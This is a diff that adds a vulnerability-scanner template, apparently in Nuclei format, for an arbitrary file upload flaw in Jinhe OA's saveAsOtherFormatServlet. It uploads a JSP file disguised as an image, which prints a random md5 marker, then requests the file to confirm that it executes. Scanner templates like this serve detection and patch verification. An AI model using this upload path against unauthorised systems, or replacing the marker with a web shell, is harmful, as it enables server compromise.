@@ -1,0 +1,52 @@
+id: poc-yaml-jinher-oa-saveasotherformatservlet-interface-anyfile-upload
+info:
+  name: Jinhe OA saveAsOtherFormatServlet Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Vulnerability in Jinhe OA saveAsOtherFormatServlet interface allows arbitrary file upload.
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/jc6/servlet/saveAsOtherFormatServlet?fileName={{t1}}.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=74f0dc3df975274386a11be68cacc0e5"
+    body: |-
+      --74f0dc3df975274386a11be68cacc0e5
+      Content-Disposition: form-data; name="FileBlod"; filename="123.jsp"
+      Content-Type: image/png
+
+      <% out.println("{{t2}}");%>
+      --74f0dc3df975274386a11be68cacc0e5--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "OK"
+        part: body
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/jc6/upload/gwzw/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
